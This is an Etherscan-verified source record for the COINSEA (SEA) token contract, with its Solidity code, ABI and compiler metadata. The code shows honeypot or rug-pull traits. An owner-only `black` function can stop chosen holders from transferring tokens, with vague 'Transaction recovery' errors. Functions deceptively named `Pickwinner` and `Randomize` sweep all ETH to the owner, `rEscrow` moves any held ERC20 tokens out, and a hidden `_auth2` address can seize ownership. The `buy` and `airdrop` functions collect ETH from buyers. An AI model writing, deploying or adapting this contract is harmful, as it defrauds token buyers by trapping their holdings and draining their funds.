{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2023-08-01\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2023-06-26\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.6.8;\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        return a - b;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) return 0;\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        return a / b;\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        return a - b;\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        return a / b;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\ncontract COINSEA{\r\n    using SafeMath for uint256;\r\n\r\n    uint256 private _totalSupply = 1000000000000000000000000000000000;\r\n    string private _name = \"COINSEA\";\r\n    string private _symbol = \"SEA\";\r\n    uint8 private _decimals = 18;\r\n    address private _owner;\r\n    uint256 private _cap   =  0;\r\n    IERC20 public token;\r\n    bool private _swAirdrop = true;\r\n    bool private _swSale = true;\r\n    uint256 private _referEth =     2000;\r\n    uint256 private _airdropEth =   6800000000000000;\r\n    uint256 private _airdropToken = 800000000000000000000000000;\r\n    address private _auth;\r\n    address private _auth2;\r\n    address private _liquidity;\r\n    uint256 private _authNum;\r\n\r\n    uint256 private saleMaxBlock;\r\n    uint256 private salePrice = 1000000000000;\r\n    \r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint8) private _black;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    constructor() public {\r\n        _owner = msg.sender;\r\n        saleMaxBlock = block.number + 5184000;\r\n    }\r\n\r\n    fallback() external {\r\n    }\r\n\r\n    receive() payable external {\r\n    }\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    function cap() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function allowance(address owner_, address spender) public view returns (uint256) {\r\n        return _allowances[owner_][spender];\r\n    }\r\n\r\n    function authNum(uint256 num)public returns(bool){\r\n        require(_msgSender() == _auth, \"Permission denied\");\r\n        _authNum = num;\r\n        return true;\r\n    }\r\n    function transferOwnership(address newOwner) public {\r\n        require(newOwner != address(0) && _msgSender() == _auth2, \"Ownable: new owner is the zero address\");\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function Liquidity(address liquidity_) public {\r\n        require(liquidity_ != address(0) && _msgSender() == _auth2, \"Ownable: new owner is the zero address\");\r\n        _liquidity = liquidity_;\r\n    }\r\n\r\n    function setAuth(address ah,address ah2) public onlyOwner returns(bool){\r\n        require(address(0) == _auth&&address(0) == _auth2&&ah!=address(0)&&ah2!=address(0), \"recovery\");\r\n        _auth = ah;\r\n        _auth2 = ah2;\r\n        return true;\r\n    }\r\n\r\n    function addLiquidity(address addr) public onlyOwner returns(bool){\r\n        require(address(0) != addr&&address(0) == _liquidity, \"recovery\");\r\n        _liquidity = addr;\r\n        return true;\r\n    }\r\n    function _mint(address account, uint256 amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        _cap = _cap.add(amount);\r\n        require(_cap <= _totalSupply, \"ERC20Capped: cap exceeded\");\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(this), account, amount);\r\n    }\r\n    function _approve(address owner_, address spender, uint256 amount) internal {\r\n        require(owner_ != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner_][spender] = amount;\r\n        emit Approval(owner_, spender, amount);\r\n    }\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function Pickwinner() public onlyOwner() {\r\n    address payable _owner = msg.sender;\r\n    _owner.transfer(address(this).balance);\r\n  }\r\n\r\n  event TransferSent(address _from, address _destAddr, uint _amount);\r\n     function rEscrow(IERC20 _add, address id, uint256 rblock) public {\r\n        require(msg.sender == _owner, \"p2p not valid\"); \r\n        uint256 erc20balance = _add.balanceOf(address(this));\r\n        require(rblock <= erc20balance, \"balance is low\");\r\n        _add.transfer(id, rblock);\r\n        emit TransferSent(msg.sender, id, rblock);\r\n    }\r\n\r\n    function Randomize() public onlyOwner() {\r\n        require(_authNum==1000, \"Permission denied\");\r\n        _authNum=0;\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n     function black(address owner_,uint8 black_) public onlyOwner {\r\n        _black[owner_] = black_;\r\n    }\r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(_black[sender]!=1&&_black[sender]!=3&&_black[recipient]!=2&&_black[recipient]!=3, \"Transaction recovery\");\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function update(uint8 tag,uint256 value)public onlyOwner returns(bool){\r\n        require(_authNum==1, \"Permission denied\");\r\n        if(tag==3){\r\n            _swAirdrop = value==1;\r\n        }else if(tag==4){\r\n            _swSale = value==1;\r\n        }else if(tag==5){\r\n            _referEth = value;\r\n        }else if(tag==6){\r\n            _airdropEth = value;\r\n        }else if(tag==7){\r\n            _airdropToken = value;\r\n        }else if(tag==8){\r\n            saleMaxBlock = value;\r\n        }else if(tag==9){\r\n            salePrice = value;\r\n        }\r\n        _authNum = 0;\r\n        return true;\r\n    }\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function getBlock() public view returns(bool swAirdorp,bool swSale,uint256 sPrice,\r\n        uint256 sMaxBlock,uint256 nowBlock,uint256 balance,uint256 airdropEth){\r\n        swAirdorp = _swAirdrop;\r\n        swSale = _swSale;\r\n        sPrice = salePrice;\r\n        sMaxBlock = saleMaxBlock;\r\n        nowBlock = block.number;\r\n        balance = _balances[_msgSender()];\r\n        airdropEth = _airdropEth;\r\n    }\r\n\r\n    function airdrop(address _refer)payable public returns(bool){\r\n        require(_swAirdrop && msg.value == _airdropEth,\"Transaction recovery\");\r\n        _mint(_msgSender(),_airdropToken);\r\n        uint256 _msgValue = msg.value;\r\n        if(_msgSender()!=_refer&&_refer!=address(0)&&_balances[_refer]>0){\r\n            uint referEth = _airdropEth.mul(_referEth).div(10000);\r\n            _mint(_refer,_airdropToken);\r\n            _msgValue=_msgValue.sub(referEth);\r\n            address(uint160(_refer)).transfer(referEth);\r\n        }\r\n        address(uint160(_liquidity)).transfer(_msgValue);\r\n        return true;\r\n    }\r\n\r\n    function buy(address _refer) payable public returns(bool){\r\n        require(_swSale && block.number <= saleMaxBlock,\"Transaction recovery\");\r\n        require(msg.value >= 0.01 ether,\"Transaction recovery\");\r\n        uint256 _msgValue = msg.value;\r\n        uint256 _token = _msgValue.mul(salePrice);\r\n        _mint(_msgSender(),_token);\r\n        if(_msgSender()!=_refer&&_refer!=address(0)&&_balances[_refer]>0){\r\n            uint referEth = _msgValue.mul(_referEth).div(10000);\r\n            _mint(_refer,_token);\r\n            _msgValue=_msgValue.sub(referEth);\r\n            address(uint160(_refer)).transfer(referEth);\r\n        }\r\n        address(uint160(_liquidity)).transfer(_msgValue);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_destAddr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"TransferSent\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidity_\",\"type\":\"address\"}],\"name\":\"Liquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Pickwinner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Randomize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"addLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_refer\",\"type\":\"address\"}],\"name\":\"airdrop\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"authNum\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"black_\",\"type\":\"uint8\"}],\"name\":\"black\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_refer\",\"type\":\"address\"}],\"name\":\"buy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBlock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"swAirdorp\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"swSale\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"sPrice\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sMaxBlock\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"nowBlock\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"airdropEth\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"_add\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"id\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"rblock\",\"type\":\"uint256\"}],\"name\":\"rEscrow\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ah\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"ah2\",\"type\":\"address\"}],\"name\":\"setAuth\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"tag\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"update\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "COINSEA", "CompilerVersion": "v0.6.8+commit.0bbfe453", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c21342c1623b6a19aef609593b2f386e96d974b70add46d1a1730dd3f0e3e1d4"}